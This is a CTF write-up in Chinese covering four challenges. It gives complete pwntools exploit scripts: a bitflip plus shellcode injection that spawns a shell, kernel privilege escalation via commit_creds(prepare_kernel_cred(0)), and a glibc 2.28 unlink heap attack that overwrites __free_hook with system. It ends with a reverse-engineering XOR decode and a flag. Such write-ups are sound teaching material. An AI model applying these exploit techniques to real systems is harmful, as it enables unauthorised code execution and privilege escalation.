## Pwn

### baby-exploit

題目敘述表示 `baby-reverse` 只需要改動一個 bit，配合 `Has RWX segments` 就可以 getshell，不過這個 bitflip 的位置限制在 `0x80-0x139`，而我們可以控制的 buffer location 在 `0xd7`，因此目標有兩種:

- 改動 bit 使得某個 instruction 能夠 jmp 到 `0xd7`
- 改動 bit 使得讀取輸入的 location 可以被執行到
  - 如果是往這個方向找方法，則只需考慮 `read` 結束後到的 instruction

jump instruction opcode 都是 `0x7X` 的形式，可以先看 `0x70` 的高 4 bits 可以從多少轉來:

```
4: 01100000, 0x60
5: 01010000, 0x50
6: 00110000, 0x30
7: 11110000, 0xf0
```

挑選目標 `4000bb:       75 49                   jne    0x400106`，當更改 `0x49` 為 `0x41`，與下個 instruction `0xbd` 相加後會得到 `0xfe`，而 `0xfe` 距離 `0xd7` 為 `0x27`，在範圍 `0x2e` 當中，因此只需要將 shellcode `0x27` 的位置放上 `jmp -0x29`，就可以跳到 shellcode 的起始位置，並且 shellcode 使用 `read(0, 0x4000d7, 100)`，就可以寫入任意長度的 shellcode。這邊要注意的是，由於 `0x4000bb` 會被程式 decode，因此會需要用到 `baby-reverse` encode 的 function。exploit 如下:

```python
#!/usr/bin/python3

from pwn import *
import sys

context.arch = 'amd64'
jmp_insts = [0x49]

def show():
    for inst in jmp_insts:
        print("--------")
        print("origin: ")
        print("   {0:08b}".format(inst) + f", {hex(inst)}")
        base = 0xbd
        for i in range(8):
            v = (inst ^ (1 << i))
            if v > 0x80:
                vv = (v + base) & 0xff
            else:
                vv = v + base
            print(f"{i}: " + "{0:08b}".format(v) + f", {hex(v)}, {hex(vv)}")

def gen():
    r = process('./babyexploit.py')
    print(f"filename: {r.recvline()}")
    r.sendlineafter('Please enter the byte-offset you want to flip (0x80-0x139): ', '0xbc')
    r.sendlineafter('Please enter the bitposition you want to flip at byte-offset(7-0): ', '0x3')
    r.interactive()

def encode(target):
    target = bytearray(target)
    for i in range(len(target)-1, 0, -1):
        target[i - 1] = target[i - 1] ^ target[i]
    return bytes(target)

def run(fn):
    r = process(fn)
    sc = asm("""
    xor rax, rax
    xor rdi, rdi
    mov rsi, 0x4000d7
    mov edx, 0x100
    syscall
    """)
    payload = sc.ljust(0x27, b'\x90')
    payload += b"\xeb\xd7\x90"
    payload = encode(payload)
    r.sendafter('Enter the Key to win: ', payload)
    sc = b'\x00'*(0xeb-0xd7) + asm(shellcraft.sh())
    r.send(sc)
    r.interactive()

def all():
    r = process('./babyexploit.py')
    r.sendlineafter('Please enter the byte-offset you want to flip (0x80-0x139): ', '0xbc')
    r.sendlineafter('Please enter the bitposition you want to flip at byte-offset(7-0): ', '0x3')
    sc = asm("""
    xor rax, rax
    xor rdi, rdi
    mov rsi, 0x4000d7
    mov edx, 0x100
    syscall
    """)
    payload = sc.ljust(0x27, b'\x90')
    payload += b"\xeb\xd7\x90"
    payload = encode(payload)
    r.sendafter('Enter the Key to win: ', payload)
    sc = b'\x00'*(0xeb-0xd7) + asm(shellcraft.sh())
    r.send(sc)
    r.interactive()

if len(sys.argv) > 1:
    if sys.argv[1] == 'show':
        show()
    elif sys.argv[1] == 'gen':
        gen()
    elif sys.argv[1] == 'run':
        run('/tmp/tmpor_jekei')
    elif sys.argv[1] == 'all':
        all()
```

### baby-kernel

init:

```bash
#!/bin/busybox sh
# /bin/sysinfo

/bin/busybox --install /bin
/bin/mkdir /sbin
/bin/busybox --install /sbin

export PATH="/bin;$PATH"
export LD_LIBRARY_PATH="/lib"

#for util in dropbear dbclient dropbearkey dropbearconvert; do
#	ln -s /bin/dropbearmulti /bin/$util
#done

mkdir -p /dev /sys /proc /tmp
mkdir -p /dev/pts

mount -t devtmpfs none /dev
# mount -t sysfs sys /sys
mount -t proc proc /proc
mount -t tmpfs none /tmp
mount -t devpts devpts /dev/pts

# chown
chown -R 0:0  /bin /etc /home /init /lib /root /tmp /var
chown -R 1000:1000 /home/user
chown 0:0 / /dev /proc /sys
chown 0:0 /flag

# chmod
chmod -R 700 /etc /home /root /var
chmod -R 755 /bin /init /lib
chmod -R 1777 /tmp
chmod 755 /
chmod 755 /etc
chmod 744 /etc/passwd /etc/group
chmod 755 /home
chmod 700 /etc/shadow

chmod 700 /flag

# echo 1 > /proc/sys/kernel/printk

mkdir -p /lib/modules/$(uname -r)

# Setup ip configuration
#ip link set lo up
#ip link set eth0 up
#udhcpc
#dropbear

insmod "/lib/modules/$(uname -r)/kernel_baby.ko"
chmod +rw /dev/flux_baby
chmod +x /client_kernel_baby

# sysinfo
# exec /bin/sh /dev/ttyS0>&0 1>/dev/ttyS0 2>&1
sleep 2

su user -c /client_kernel_baby

poweroff -f

#while true; do
#	/bin/setsid /bin/sh -c 'exec /bin/login </dev/ttyS0 >/dev/ttyS0 2>&1'
#done
```

run.sh:

```bash
qemu-system-x86_64 -monitor /dev/null -m 64 -nographic -kernel "bzImage" -initrd initrd.cpio -append "console=ttyS0 init='/init'"
```

- hint
  - You do not really need to exploit anything here
  - The flag file is not readable by your current user
  - You will need to become root to solve the challenge
  - There is a specific combination of kernel functions you will want to be using to escalate your privileges
  - We disabled Kernel ASLR in this case

沒有 `kaslr`，直接 `commit_creds(prepare_kernel_cred(0))` + `readfile("/flag")` 即可。

```python
#!/usr/bin/python3

from pwn import *

prepare_kernel_cred = 0xffffffff8104ee50 # 18446744071579168336
commit_creds = 0xffffffff8104e9d0 # 18446744071579167184

r = process(["bash", "-c", "./run.sh"])

# prepare_kernel_cred(0)
r.sendlineafter('> ', "1")
r.sendlineafter('> ', f"{prepare_kernel_cred}")
r.sendlineafter('> ', "0")
r.recvuntil("It is: ")
cred = int(r.recvline()[:-1], 16)

# commit_creds
r.sendlineafter('> ', "1")
r.sendlineafter('> ', f"{commit_creds}")
r.sendlineafter('> ', f"{cred}")

# read file
r.sendlineafter("> ", "3")
r.sendlineafter("> ", "/flag")
print(r.recvuntil("> "))
r.sendline("5")
sleep(1)
r.close()
```



- `devtmpfs`: 提供 linux kernel 啟動時建立一個暫時的 `/dev`，讓一般的 process 不用等 udev，因此能縮短開機的時間
  - Devtmpfs lets the kernel create a tmpfs very early at kernel initialization, before any driver core device is registered
  - Every device with a major/minor will have a device node created in this tmpfs instance
  - After the rootfs is mounted by the kernel, the populated tmpfs is mounted at /dev
  - In initramfs, it can be moved to the manually mounted root filesystem before /sbin/init is executed
  - `mount -t devtmpfs none /dev`
- `tmpfs`: 使用 memory 作為暫時的 fs
  - 因為是在記憶體內操作，能加快速度
  - 相較之下，ramdisk 為 block device，使用前仍需要 format (mkfs)
- `fstab`: 在開機時能自動掛載的設定檔
  - 一般位於 `/etc/fstab`
- `udev`: 為 linux device manager，負責管理 `/dev`
  - an automounter to handle the hot swapping of devices (e.g. MP3 player)
- `devpts`: pseudo fs，一般 mount 在 `/dev/pts`，與 pseudo terminal (pty) 相關
  - pty: pseudo-teletype
  - tty: teletype
- Kernel page-table isolation: `KPTI`，也簡稱 `PTI`，舊稱 `KAISER`
  - KPTI 通過完全分離 user space 與 kernel space page table 來解決 page table leak
- `/proc/sys/kernel/printk`
  - 設定 kernel log level
  - 預設為 2

### heap_heaven_2

```
// file
heap_heaven_2:        ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=28674d4fda3abc02d9f8a75f596e0f55d8e9a918, not stripped

// checksec
[*] '/tmp/tmp/ctf-pwns/heap/heap-unlink/heap_heaven_2/heap_heaven_2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

環境為 glibc 2.28。

程式給予的功能為: 可以在 `mmap()` 的空間中任意寫 + 任意讀 (ptr) + 任意 `free()`，不過因為 `mmap()` 出來的空間並沒有其他 address，因此必須要透過 `free()` 來 leak address，可以透過 `free() * 2` 的到 `mmap()` 出來的 address， `free() * 8` 得到 unsorted bin fd 以及 bk (libc)，而 fd bk 指向 main_arena，因此也可以 leak heap，heap 中會有 code，所以也能 leak code。

下一步必須思考這些 address 如何透過 `free()` 的機制做到任意寫，而這時候會注意到，`mmapped` 為指向 `mmap()` 出來的 pointer，並且操作都會使用到這個 pointer 來存取 `mmap()` 出來的區塊，因此可以將焦點放在篡改 `mmapped` 上。而最後使用的篡改方式為 `unlink`，原始碼如下:

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");               \
    FD = P->fd;                                   \
    BK = P->bk;                                   \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))             \
      malloc_printerr ("corrupted double-linked list");               \
    else {                                    \
        FD->bk = BK;                                  \
        BK->fd = FD;                              \
        ... \
      }                                       \
}

/* consolidate backward */
if (!prev_inuse(p)) {
  prevsize = prev_size (p);
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  unlink(av, p, bck, fwd);
}
...
/* consolidate forward */
if (!nextinuse) {
    unlink(av, nextchunk, bck, fwd);
    size += nextsize;
} else {
    ...
}
```

當 `free()` 完當前的 chunk 後，會繼續檢查上個 / 下個 chunk 是否 inuse，如果沒有的話就會 trigger `unlink()`。`unlink()` 會先檢查前後 chunk 是否與中間的 chunk 互指 (`FD->bk == P && BK->fd == P`)，而後會 `FD->bk = BK`，等價於 `p->fd->bk = p->bk`，以及 `BK->fd = FD`，等價於 `p->bk->fd = p->fd`，更新前後的 fd or bk，讓中間的 memory chunk 被釋放。

由於 `mmapped` 指向 `mmap_region`，如果 `mmap_region->fd` == `mmapped - 0x18`、`mmap_region->bk` == `mmapped - 0x10`，這樣就能符合 `FD->bk == P (*bk+0x18 == P) && BK->fd == P (*bk+0x10 == P)`。不過由於 `FD->bk == BK->fd == *(mmapped) == mmap_region`，所以最後 `mmapped` 的結果會由 `BK->fd = FD;` 來決定，也就是 `mmaped - 0x18` (`mmapped = mmapped - 0x18`)。

之後就可以透過修改 `mmapped` 寫到任意位置，這邊選 `__free_hook` 為 `system()`，之後就直接 `free("/bin/sh")`，exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

"""
[1] : write to heap
[2] : alloc on heap # not implement
[3] : free from heap
[4] : leak
[5] : exit
"""

def wr(off, payload):
    r.sendlineafter("[5] : exit\n", "1")
    r.sendlineafter("How much do you want to write?\n", str(len(payload)))
    r.sendlineafter("At which offset?\n", str(off))
    sleep(0.1)
    r.send(payload)

def fr(off):
    r.sendlineafter("[5] : exit\n", "3")
    r.sendlineafter("At which offset do you want to free?\n", str(off))

def leak(off):
    r.sendlineafter("[5] : exit\n", "4")
    r.sendlineafter("At which offset do you want to leak?\n", str(off))

fake_chunk = p64(0) + p64(0x91) + b'\x00'*0x80
fake_chunk += p64(0) + p64(0x21) + b'\x00'*0x10
fake_chunk += p64(0) + p64(0x21)

r = process("./H", env={"LD_PRELOAD": "./libc-2.28.so"})
wr(0, p64(0) + p64(0xa1))

for _ in range(2):
    fr(0x10)

leak(0x10)
mmap = u64(r.recvline()[:-1].ljust(8, b'\x00')) - 0x10
info(f"mmap: {hex(mmap)}")
for _ in range(5): # fill 0xa0 tcache
    fr(0x10)

wr(0x20, fake_chunk)
for _ in range(8):
    fr(0x30)

### leak libc
wr(0, p64(mmap + 0x30))
leak(0)
libc = u64(r.recv(6).ljust(8, b'\x00')) - 0x1e4ca0
info(f"libc: {hex(libc)}")
__free_hook = libc + 0x1e68e8
unsorted_bin = libc + 0x1e4ca0
_stdin = libc + 0x1e4a00
_system = libc + 0x50300

### leak heap
leak(0x30)
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0x290
info(f"heap: {hex(heap)}")

### leak code
wr(0, p64(heap + 0x280))
leak(0)
code = u64(r.recv(6).ljust(8, b'\x00')) - 0x1670
info(f"code: {hex(code)}")
mmapped = code + 0x4048

fake_chunk2 = p64(0) + p64(0xa1) + p64(mmapped - 0x18) + p64(mmapped - 0x10)
fake_chunk2 += p64(0) + p64(0x91) + p64(unsorted_bin)*2
fake_chunk2 = fake_chunk2.ljust(0xa0, b'\x00')
fake_chunk2 += p64(0xa0) + p64(0xa0) + p64(0) + p64(0)
fake_chunk2 = fake_chunk2.ljust(0xa0*2, b'\x00')
fake_chunk2 += p64(0) + p64(0x21) + p64(0)*2
fake_chunk2 += p64(0) + p64(0x21) + p64(0)*2
wr(0, fake_chunk2)
fr(0xa0+0x10)

payload = p64(_stdin) + p64(0) + p64(heap + 0x260) + p64(__free_hook-0x8)
wr(0, payload)
wr(0, b"/bin/sh\x00" + p64(_system))
fr(0) # get shell

r.interactive()
```



## Reverse

### baby-reverse

`README.md` 列了一些問題給比較沒經驗的 reverser:

- What kind of binary have you got infront of you? (Hint: "file" command)
  - `chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped`
- How can you disassemble the file? (objdump, gdb, radare...)
  - `objdump`、`ida`
- Which programs are common debuggers?
  - `gdb`
- How can I use them? (we recommend gdb with the peda plugin)
  - how can I set breakpoints?
    - `b`
  - in which different ways can I step through programs?
    - `si`、`s`、`ni`、`n`
  - how can I print/examine the content of memory/addresses
    - `x/30gx <address>`
- what is inside registers? what's rax, rip, rsp?
  - `rax`: return value
  - `rip`: instruction pointer
  - `rsp`: top of stack
- what is the linux syscall convention?
  - In which register is the second argument?
    - `rsi`
  - In which register is the syscall number?
    - `rax`
    - where can I find the syscall numbers on my own linux system?
      - [some websites](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
      - [linux source code](https://github.com/torvalds/linux/blob/v4.17/arch/x86/entry/syscalls/syscall_64.tbl#L11)
- what happens at a call instruction?
  - push next instruction into stack and jump to target
- how can I compare strings in assembly?
  - `cmp` -> `je`
- .. ask your teammates for more! annoy them if anything is unclear :P
- .. if you don't got any teammates, use IRC and say that it's about the baby challenge

程式用 ida 或是 objdump 等 disassembler 解都會壞掉，所以直接用 ida 看，發現是前後 xor，最後比對特定 bytes sequence，寫個腳本轉回去即可:

```python
#!/usr/bin/python3                                                                                                                        
target = bytearray(b'\n\r\x06\x1c"8\x18&6\x0f9+\x1cYB,6\x1a,&\x1c\x17-9WC\x01\x07+8\t\x07\x1a\x01\x17\x13\x13\x17-9\n\r\x06F\\}')                                           
                       
for i in range(len(target)-1, 0, -1):
    target[i - 1] = target[i - 1] ^ target[i]
    
print(target)
```

`flag{Yay_if_th1s_is_yer_f1rst_gnisrever_flag!}`

